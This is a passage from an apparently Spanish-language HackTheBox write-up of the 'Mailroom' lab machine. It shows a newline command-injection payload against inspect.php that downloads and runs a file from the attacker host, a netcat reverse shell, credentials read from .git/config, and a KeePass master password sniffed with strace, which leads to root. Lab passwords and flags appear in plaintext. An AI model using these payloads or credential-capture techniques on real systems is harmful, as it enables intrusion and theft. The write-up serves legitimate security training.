X-Original-To: tristan@mailroom.htb
Delivered-To: tristan@mailroom.htb
Received: from localhost (unknown [172.19.0.5])
        by mailroom.localdomain (Postfix) with SMTP id 66C111D09
        for <tristan@mailroom.htb>; Mon, 14 Aug 2023 01:44:23 +0000 (UTC)
Subject: 2FA

Click on this link to authenticate: http://staff-review-panel.mailroom.htb/auth.php?token=50b452a6c7c7e3a5858e40ce5ac37954
{% endhighlight %}

La web principal se ejecuta con Apache2, pero Apache2 no existe dentro de ssh.

Viendo los servicios vemos un docker-compose-app.service, y es altamente probable que se ejecute el servidor de Apache2 en un contenedor.
{% highlight sh %}
tristan@mailroom:~$ ls -la /etc/systemd/system
total 68
drwxr-xr-x 16 root root 4096 Mar 14 11:41 .
drwxr-xr-x  5 root root 4096 Mar 25 19:10 ..
lrwxrwxrwx  1 root root   40 Aug 31  2022 dbus-org.freedesktop.ModemManager1.service -> /lib/systemd/system/ModemManager.service
lrwxrwxrwx  1 root root   44 Aug 31  2022 dbus-org.freedesktop.resolve1.service -> /lib/systemd/system/systemd-resolved.service
lrwxrwxrwx  1 root root   36 Jan 15  2023 dbus-org.freedesktop.thermald.service -> /lib/systemd/system/thermald.service
lrwxrwxrwx  1 root root   45 Aug 31  2022 dbus-org.freedesktop.timesync1.service -> /lib/systemd/system/systemd-timesyncd.service
drwxr-xr-x  2 root root 4096 Jan 19  2023 default.target.wants
-rw-r--r--  1 root root  311 Jan 15  2023 docker-compose-app.service
drwxr-xr-x  2 root root 4096 Jan 15  2023 emergency.target.wants
drwxr-xr-x  2 root root 4096 Aug 31  2022 getty.target.wants
drwxr-xr-x  2 root root 4096 Aug 31  2022 graphical.target.wants
lrwxrwxrwx  1 root root   38 Aug 31  2022 iscsi.service -> /lib/systemd/system/open-iscsi.service
drwxr-xr-x  2 root root 4096 Aug 31  2022 mdmonitor.service.wants
lrwxrwxrwx  1 root root   38 Aug 31  2022 multipath-tools.service -> /lib/systemd/system/multipathd.service
drwxr-xr-x  2 root root 4096 Mar 25 18:43 multi-user.target.wants
drwxr-xr-x  2 root root 4096 Mar 14 11:40 network-online.target.wants
drwxr-xr-x  2 root root 4096 Aug 31  2022 open-vm-tools.service.requires
drwxr-xr-x  2 root root 4096 Aug 31  2022 paths.target.wants
drwxr-xr-x  2 root root 4096 Jan 15  2023 rescue.target.wants
drwxr-xr-x  2 root root 4096 Jan 15  2023 sleep.target.wants
drwxr-xr-x  2 root root 4096 Jan 19  2023 sockets.target.wants
lrwxrwxrwx  1 root root   31 Jan 15  2023 sshd.service -> /lib/systemd/system/ssh.service
drwxr-xr-x  2 root root 4096 Aug 31  2022 sysinit.target.wants
lrwxrwxrwx  1 root root   35 Aug 31  2022 syslog.service -> /lib/systemd/system/rsyslog.service
drwxr-xr-x  2 root root 4096 Jan 19  2023 timers.target.wants
lrwxrwxrwx  1 root root   41 Aug 31  2022 vmtoolsd.service -> /lib/systemd/system/open-vm-tools.service
tristan@mailroom:~$ cat /etc/systemd/system/docker-compose-app.service
[Unit]
Description=Docker Compose Application Service
Requires=docker.service
After=docker.service

[Service]
Type=oneshot
RemainAfterExit=yes
WorkingDirectory=/root/containers
ExecStart=/usr/bin/docker-compose up -d
ExecStop=/usr/bin/docker-compose down
TimeoutStartSec=0

[Install]
WantedBy=multi-user.target
{% endhighlight %}

`docker.service`
{% highlight sh %}
‚óè docker.service - Docker Application Container Engine
     Loaded: loaded (/lib/systemd/system/docker.service; enabled; vendor preset: enabled)
     Active: active (running) since Sun 2023-08-13 23:31:28 UTC; 2h 38min ago
TriggeredBy: ‚óè docker.socket
       Docs: https://docs.docker.com
   Main PID: 1154
      Tasks: 26
     Memory: 108.2M
     CGroup: /system.slice/docker.service
             ‚îú‚îÄ1154 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
             ‚îú‚îÄ2049 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 80 -container-ip 172.19.0.5 -container-port 80
             ‚îî‚îÄ2058 /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 80 -container-ip 172.19.0.5 -container-port 80
{% endhighlight %}

El contenedor tiene la ip `172.19.0.5`
{% highlight sh %}
tristan@mailroom:~$ curl --url http://172.19.0.5 --head
HTTP/1.1 200 OK
Date: Mon, 14 Aug 2023 02:12:20 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Content-Type: text/html; charset=UTF-8
{% endhighlight %}

Realizamos port forwarding y nos autenticamos en staff-review-panel.mailroom.htb con el token.
{% highlight sh %}
Œª ubuntu-pc Mailroom ‚Üí sshpass -p '69trisRulez!' ssh tristan@mailroom.htb -L 8000:172.19.0.5:80
{% endhighlight %}

Hay que modificar `/etc/hosts` a `127.0.0.1 staff-review-panel.mailroom.htb`.

Visitar `staff-review-panel.mailroom.htb` nos devuelve.

![staff-web](/assets/hackthebox/img/machines/hard/mailroom/staff-web.png)

Aqui se gestiona los mensajes que enviamos anteriormente.

Enviar nuevamente un mensaje y copiar el identificador /inquiries/`da264264fd0835053a3f70b86b3b65a4`.html y introducirlo aqui devuelve lo que introduccimos.

![staff-read](/assets/hackthebox/img/machines/hard/mailroom/staff-read.png)

Aqui no funciona el XSS, solo funciona desde `/inquiries/da264264fd0835053a3f70b86b3b65a4.html`

![read-xss](/assets/hackthebox/img/machines/hard/mailroom/read-xss.png)

Leyendo el codigo de `inspect.php`, vemos que podemos abusar de `CLRF` y obtener RCE.

{% highlight php %}
if (isset($_POST['status_id'])) {
  $inquiryId = preg_replace('/[\$<>;|&{}\(\)\[\]\'\"]/', '', $_POST['status_id']);
  $contents = shell_exec("cat /var/www/mailroom/inquiries/$inquiryId.html");
[...cortado...]
{% endhighlight %}

Obtengo shell de esta forma.
{% highlight sh %}
Œª ubuntu-pc Mailroom ‚Üí curl --cookie "PHPSESSID=dfc6e94fd7a145fe31a4bf1684cc3a15" --request POST --data-raw "status_id=%0Acurl+10.10.14.189:9001+-o+/tmp/l" --silent --url http://staff-review-panel.mailroom.htb:8000/inspect.php 1>/dev/null && curl --cookie "PHPSESSID=dfc6e94fd7a145fe31a4bf1684cc3a15" --request POST --data-raw "status_id=%0Ash+/tmp/l" --url http://staff-review-panel.mailroom.htb:8000/inspect.php --silent 1>/dev/null
{% endhighlight %}

netcat
{% highlight sh %}
Œª ubuntu-pc Mailroom ‚Üí nc -lnvp 1337                                         
Ncat: Version 7.80 ( https://nmap.org/ncat )                                 
Ncat: Listening on :::1337                                                   
Ncat: Listening on 0.0.0.0:1337                                              
Ncat: Connection from 10.10.11.209.                                          
Ncat: Connection from 10.10.11.209:53162.                                    
bash: cannot set terminal process group (1): Inappropriate ioctl for device  
bash: no job control in this shell                                           
www-data@011649ed96da:/var/www/staffroom$                                    
{% endhighlight %}

shell
{% highlight sh %}
Œª ubuntu-pc Mailroom ‚Üí shell
2023/08/13 22:40:00 Nueva conexion.
{% endhighlight %}
Subimis lse.sh y nos encuentra 2 .git directorios, al hacerle cat al archivo `.git/config` encontramos credenciales del usuario matthew.
{% highlight sh %}
www-data@011649ed96da:/var/www$ cat /var/www/*/.git/config 2>&-
cat /var/www/*/.git/config 2>&-
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://matthew:HueLover83%23@gitea:3000/matthew/mailroom.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
[user]
        email = matthew@mailroom.htb
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://matthew:HueLover83%23@gitea:3000/matthew/staffroom.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
[user]
        email = matthew@mailroom.htb
{% endhighlight %}

Iniciar sesion en  `git.mailroom.htb` nos devuelve el mismo codigo de estado 500.

No funcionan en ssh.
{% highlight sh %}
Œª ubuntu-pc Mailroom ‚Üí sshpass -p 'HueLover83#' ssh matthew@10.10.11.209
matthew@10.10.11.209: Permission denied (publickey).
{% endhighlight %}

Desde la sesion de tristan si funciona.

Y obtenemos user.txt
{% highlight sh %}
tristan@mailroom:~$ su --login matthew
Password: HueLover83#
matthew@mailroom:~$ cat user.txt
c2c1e4eb34b133fcec835f912725cdee
{% endhighlight %}

Subiendo pspy y ejecutandolo vemos que nuestro usuario ejecuta `/usr/bin/perl /usr/bin/kpcli`.
{% highlight sh %}
2023/08/14 02:56:47 CMD: UID=1001  PID=32750  | ./pspy
2023/08/14 02:56:47 CMD: UID=1001  PID=32737  | /usr/bin/perl /usr/bin/kpcli
2023/08/14 02:56:47 CMD: UID=1001  PID=32731  | /lib/systemd/systemd --user
2023/08/14 02:56:47 CMD: UID=1001  PID=32101  | -bash
{% endhighlight %}
Leamos el historial.
{% highlight sh %}
matthew@mailroom:~$ ls -al .kpcli-history
lrwxrwxrwx 1 root root 9 Jan 15  2023 .kpcli-history -> /dev/null
matthew@mailroom:~$ unlink .kpcli-history
{% endhighlight %}

Esperamos y leemos.
{% highlight sh %}
matthew@mailroom:~$ cat .kpcli-history
open /home/matthew/personal.kdbx
ls Root/
show -f 0
open /home/matthew/personal.kdbx
ls Root/
show -f 0
{% endhighlight %}
Buscando informacion acerca de ese proceso, pero encontramos un archivo inusual `_usr_bin_strace.1001.crash`.
{% highlight sh %}
matthew@mailroom:~$ crontab -l
no crontab for matthew
matthew@mailroom:~$ find / -user matthew -or -group matthew 2>&- | grep -vE "/proc|/dev|/sys|/var/run|/run"
/home/matthew
/home/matthew/personal.kdbx.lock
/home/matthew/.cache
/home/matthew/.cache/motd.legal-displayed
/home/matthew/.bash_logout
/home/matthew/user.txt
/home/matthew/.bash_history
/home/matthew/pspy
/home/matthew/.bashrc
/home/matthew/.kpcli-history
/home/matthew/.profile
/home/matthew/.viminfo
/home/matthew/personal.kdbx
/var/crash/_usr_bin_strace.1001.crash
{% endhighlight %}
Viendo la fecha, este archivo no fue creado por algun usuario, porque existe desde el 16 de marzo del a√±o 2023, debe ser una pista.
{% highlight sh %}
matthew@mailroom:~$ ls --full-time /var/crash/_usr_bin_strace.1001.crash
-rw-r----- 1 matthew matthew 164238 2023-03-16 22:54:52.438647278 +0000 /var/crash/_usr_bin_strace.1001.crash
matthew@mailroom:~$ date
Mon 14 Aug 2023 03:06:48 AM UTC
matthew@mailroom:~$ uptime
03:06:50 up  3:35,  1 user,  load average: 0.00, 0.03, 0.02
{% endhighlight %}

Alguien se autentica con mi usuario usando su y ejecuta kpcli.
{% highlight sh %}
2023/08/14 03:09:31 FS:                 OPEN | /usr/bin/su
2023/08/14 03:09:31 FS:               ACCESS | /usr/bin/su
2023/08/14 03:09:31 FS:               ACCESS | /usr/bin/su
2023/08/14 03:09:31 FS:               ACCESS | /usr/bin/su
{% endhighlight %}

#### Root.txt

Con strace podemos hacer un seguimiento de las llamadas al sistema que utiliza el proceso kpcli.

Usando `strace  -p $(pidof perl)`, nos muestra mucha basura.
{% highlight sh %}
matthew@mailroom:~$ strace  -p $(pidof perl)
strace: Process 35467 attached
pselect6(4, [3], NULL, NULL, NULL, {[], 8}) = 1 (in [3])
read(3, "x", 1)                         = 1
select(4, [3], NULL, [3], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
write(4, "x", 1)                        = 1
pselect6(4, [3], NULL, NULL, NULL, {[], 8}) = 1 (in [3])
read(3, "\n", 1)                        = 1
write(4, "\n", 1)                       = 1
ioctl(3, TCGETS, {B38400 opost isig -icanon -echo ...}) = 0
ioctl(3, SNDCTL_TMR_STOP or TCSETSW, {B38400 opost isig icanon echo ...}) = 0
ioctl(3, TCGETS, {B38400 opost isig icanon echo ...}) = 0
{% endhighlight %}
Lo interesante es ver solo lo que escribe con `strace -e trace=write  -p $(pidof perl)`.
{% highlight sh %}
matthew@mailroom:~$ strace -e trace=write  -p $(pidof perl)
strace: Process 35535 attached
Trace/breakpoint trap (core dumped)
matthew@mailroom:~$ strace -e trace=write  -p $(pidof perl)
strace: Process 47381 attached
--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=47393, si_uid=1001, si_status=1, si_utime=0, si_stime=0} ---
write(1, "\nKeePass CLI (kpcli) v3.1 is rea"..., 161) = 161
write(1, "\n", 1)                       = 1
write(4, "kpcli:/> ", 9)                = 9
Trace/breakpoint trap (core dumped)
strace: Process 47381 attached
write(4, "p", 1)                        = 1
write(4, "e", 1)                        = 1
write(4, "n", 1)                        = 1
write(4, " ", 1)                        = 1
write(4, "/", 1)                        = 1
write(4, "h", 1)                        = 1
write(4, "o", 1)                        = 1
write(4, "m", 1)                        = 1
write(4, "e", 1)                        = 1
write(4, "/", 1)                        = 1
write(4, "m", 1)                        = 1
write(4, "a", 1)                        = 1
write(4, "t", 1)                        = 1
write(4, "t", 1)                        = 1
write(4, "h", 1)                        = 1
write(4, "e", 1)                        = 1
write(4, "w", 1)                        = 1
write(4, "/", 1)                        = 1
write(4, "p", 1)                        = 1
write(4, "e", 1)                        = 1
write(4, "r", 1)                        = 1
write(4, "s", 1)                        = 1
write(4, "o", 1)                        = 1
write(4, "n", 1)                        = 1
write(4, "a", 1)                        = 1
write(4, "l", 1)                        = 1
write(4, ".", 1)                        = 1
write(4, "k", 1)                        = 1
write(4, "d", 1)                        = 1
write(4, "b", 1)                        = 1
write(4, "x", 1)                        = 1
write(4, "\n", 1)                       = 1
write(1, "Please provide the master passwo"..., 36) = 36
write(1, "*", 1)                        = 1
write(1, "*", 1)                        = 1
write(1, "*", 1)                        = 1
write(1, "*", 1)                        = 1
write(1, "*", 1)                        = 1
write(1, "*", 1)                        = 1
write(1, "*", 1)                        = 1
write(1, "*", 1)                        = 1
write(1, "*", 1)                        = 1
write(1, "*", 1)                        = 1
write(1, "*", 1)                        = 1
write(1, "*", 1)                        = 1
write(1, "*", 1)                        = 1
write(1, "*", 1)                        = 1
write(1, "\10 \10", 3)                  = 3
write(1, "*", 1)                        = 1
write(1, "*", 1)                        = 1
write(1, "*", 1)                        = 1
write(1, "*********", 9)                = 9
write(1, "\n", 1)                       = 1
write(4, "kpcli:/> ", 9)                = 9
write(4, "l", 1)                        = 1
write(4, "s", 1)                        = 1
write(4, " ", 1)                        = 1
write(4, "R", 1)                        = 1
write(4, "o", 1)                        = 1
write(4, "o", 1)                        = 1
write(4, "t", 1)                        = 1
write(4, "/", 1)                        = 1
write(4, "\n", 1)                       = 1
write(1, "=== Entries ===\n", 16)       = 16
write(1, "0. food account                 "..., 375) = 375
write(4, "kpcli:/> ", 9)                = 9
write(4, "s", 1)                        = 1
write(4, "h", 1)                        = 1
write(4, "o", 1)                        = 1
write(4, "w", 1)                        = 1
write(4, " ", 1)                        = 1
write(4, "-", 1)                        = 1
write(4, "f", 1)                        = 1
write(4, " ", 1)                        = 1
write(4, "0", 1)                        = 1
write(4, "\n", 1)                       = 1
write(1, "\n", 1)                       = 1
write(1, "Title: food account\nUname: matth"..., 120) = 120
write(1, "\n", 1)                       = 1
write(4, "kpcli:/> ", 9)                = 9
write(4, "q", 1)                        = 1
write(4, "u", 1)                        = 1
write(4, "i", 1)                        = 1
write(4, "t", 1)                        = 1
write(4, "\n", 1)                       = 1
write(6, "open /home/matthew/personal.kdbx"..., 2723) = 2723
+++ exited with 0 +++
{% endhighlight %}
No logra imprimir la master password.

Veamos que lee usando `strace -e trace=read  -p $(pidof perl)`
{% highlight sh%}
matthew@mailroom:~$ strace -e trace=read  -p $(pidof perl)
strace: Process 51144 attached
read(3, "e", 1)                         = 1
read(3, "n", 1)                         = 1
read(3, " ", 1)                         = 1
read(3, "/", 1)                         = 1
read(3, "h", 1)                         = 1
read(3, "o", 1)                         = 1
read(3, "m", 1)                         = 1
read(3, "e", 1)                         = 1
read(3, "/", 1)                         = 1
read(3, "m", 1)                         = 1
read(3, "a", 1)                         = 1
read(3, "t", 1)                         = 1
read(3, "t", 1)                         = 1
read(3, "h", 1)                         = 1
read(3, "e", 1)                         = 1
read(3, "w", 1)                         = 1
read(3, "/", 1)                         = 1
read(3, "p", 1)                         = 1
read(3, "e", 1)                         = 1
read(3, "r", 1)                         = 1
read(3, "s", 1)                         = 1
read(3, "o", 1)                         = 1
read(3, "n", 1)                         = 1
read(3, "a", 1)                         = 1
read(3, "l", 1)                         = 1
read(3, ".", 1)                         = 1
read(3, "k", 1)                         = 1
read(3, "d", 1)                         = 1
read(3, "b", 1)                         = 1
read(3, "x", 1)                         = 1
read(3, "\n", 1)                        = 1
read(5, "\3\331\242\232g\373K\265\1\0\3\0\2\20\0001\301\362\346\277qCP\276X\5!j\374Z\377\3"..., 8192) = 1998
read(0, 0x55d5d70df5d0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x55d5d70df5d0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x55d5d70df5d0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x55d5d70df5d0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "!", 8192)                      = 1
read(0, 0x55d5d70df5d0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x55d5d70df5d0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x55d5d70df5d0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "s", 8192)                      = 1
read(0, 0x55d5d70df5d0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "E", 8192)                      = 1
read(0, 0x55d5d70df5d0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x55d5d70df5d0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x55d5d70df5d0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "c", 8192)                      = 1
read(0, 0x55d5d70df5d0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x55d5d70df5d0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x55d5d70df5d0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "U", 8192)                      = 1
read(0, 0x55d5d70df5d0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x55d5d70df5d0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x55d5d70df5d0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "r", 8192)                      = 1
read(0, 0x55d5d70df5d0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x55d5d70df5d0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "3", 8192)                      = 1
read(0, 0x55d5d70df5d0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "p", 8192)                      = 1
read(0, 0x55d5d70df5d0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x55d5d70df5d0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x55d5d70df5d0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x55d5d70df5d0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "4", 8192)                      = 1
read(0, 0x55d5d70df5d0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x55d5d70df5d0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x55d5d70df5d0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x55d5d70df5d0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "$", 8192)                      = 1
read(0, "$", 8192)                      = 1
read(0, 0x55d5d70df5d0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x55d5d70df5d0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "w", 8192)                      = 1
read(0, 0x55d5d70df5d0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "0", 8192)                      = 1
read(0, "1", 8192)                      = 1
read(0, "\10", 8192)                    = 1
read(0, 0x55d5d70df5d0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x55d5d70df5d0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "r", 8192)                      = 1
read(0, 0x55d5d70df5d0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x55d5d70df5d0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x55d5d70df5d0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "d", 8192)                      = 1
read(0, 0x55d5d70df5d0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x55d5d70df5d0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "9", 8192)                      = 1
read(0, 0x55d5d70df5d0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x55d5d70df5d0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x55d5d70df5d0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "\n", 8192)                     = 1
read(5, "\3\331\242\232g\373K\265\1\0\3\0\2\20\0001\301\362\346\277qCP\276X\5!j\374Z\377\3"..., 8192) = 1998
read(5, "\npackage Compress::Raw::Zlib;\n\nr"..., 8192) = 8192
read(5, " if $validate && $value !~ /^\\d+"..., 8192) = 8192
read(5, "    croak \"Compress::Raw::Zlib::"..., 8192) = 8192
read(5, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0)\0\0\0\0\0\0"..., 832) = 832
read(5, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\200\"\0\0\0\0\0\0"..., 832) = 832
read(5, "# XML::Parser\n#\n# Copyright (c) "..., 8192) = 8192
read(6, "package XML::Parser::Expat;\n\nuse"..., 8192) = 8192
read(6, ";\n    }\n}\n\nsub position_in_conte"..., 8192) = 8192
read(6, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\240<\0\0\0\0\0\0"..., 832) = 832
read(6, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0000B\0\0\0\0\0\0"..., 832) = 832
read(5, "package MIME::Base64;\n\nuse stric"..., 8192) = 5450
read(5, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\300\22\0\0\0\0\0\0"..., 832) = 832
read(6, "\3\331\242\232g\373K\265\1\0\3\0\2\20\0001\301\362\346\277qCP\276X\5!j\374Z\377\3"..., 8192) = 1998
read(6, "", 8192)                       = 0
read(3, "l", 1)                         = 1
read(3, "s", 1)                         = 1
read(3, " ", 1)                         = 1
read(3, "R", 1)                         = 1
read(3, "o", 1)                         = 1
read(3, "o", 1)                         = 1
read(3, "t", 1)                         = 1
read(3, "/", 1)                         = 1
read(3, "\n", 1)                        = 1
read(3, "s", 1)                         = 1
read(3, "h", 1)                         = 1
read(3, "o", 1)                         = 1
read(3, "w", 1)                         = 1
read(3, " ", 1)                         = 1
read(3, "-", 1)                         = 1
read(3, "f", 1)                         = 1
read(3, " ", 1)                         = 1
read(3, "0", 1)                         = 1
read(3, "\n", 1)                        = 1
read(3, "q", 1)                         = 1
read(3, "u", 1)                         = 1
read(3, "i", 1)                         = 1
read(3, "t", 1)                         = 1
read(3, "\n", 1)                        = 1
read(7, "# NOTE: Derived from blib/lib/Te"..., 8192) = 665
read(7, "", 8192)                       = 0
+++ exited with 0 +++
{% endhighlight %}
Obtenemos `!sEcUr3p4$$w01\rd9`.

Usamos kpcli y abrimos personal.kdbx, pero no es valida.

El \r me hace pensar que ahy termina la password (retorno de carro), pero no funciona de todas formas

Me queda claro que hay que modificar la contrase√±a, despues de volver a leer la salida de strace me fijo que en realidad no es "01\" sino "\10"  `read(0, "\10", 8192)` aun no funciona `!sEcUr3p4$$w\01rd9`.

Siguendo lo que hace "\r" en lenguajes de programacion es solamente un termino de linea(retorno de carro), lo elimino y queda `!sEcUr3p4$$w01d9` que tampoco funciona, eliminado solo "\" queda `!sEcUr3p4$$w01rd9` se ve mejor pero aun no es valida, siguiendo la similitud que tiene con la palabra "password" quedaria asi `!sEcUr3p4$$w0rd9` y alfin es valida.

{% highlight sh %}
kpcli:/> open personal.kdbx
Please provide the master password: *************************
kpcli:/> ls
=== Groups ===
Root/
kpcli:/> ls Root/
=== Entries ===
0. food account                                            door.dash.local
1. GItea Admin account                                    git.mailroom.htb
2. gitea database password
3. My Gitea Account                                       git.mailroom.htb
4. root acc
kpcli:/> show -f 0

Title: food account
Uname: matthew_doordash
 Pass: fake_password
  URL: http://door.dash.local/
Notes: yum yum food yum

kpcli:/> show -f 1

Title: GItea Admin account
Uname: administrator
 Pass: CZTwvKT7yHyEdb4
  URL: http://git.mailroom.htb/
Notes: For fixing stuff only!

kpcli:/> show -f 2

Title: gitea database password
Uname: gitea
 Pass: gitea_l33t_p@ssw04d
  URL:
Notes:

kpcli:/> show -f 3

Title: My Gitea Account
Uname: matthew
 Pass: HueLover83#
  URL: http://git.mailroom.htb/
Notes: for work

kpcli:/> show -f 4

Title: root acc
Uname: root
 Pass: a$gBa3!GA8
  URL:
Notes: root account for sysadmin jobs
{% endhighlight %}
La ultima credencial `a$gBa3!GA8` es valida para el usuario root.
{% highlight sh %}
matthew@mailroom:~$ su --login root
Password: a$gBa3!GA8
root@mailroom:~# cat /root/root.txt
933d91203803f0e3e4e3d69757a5d621
{% endhighlight %}
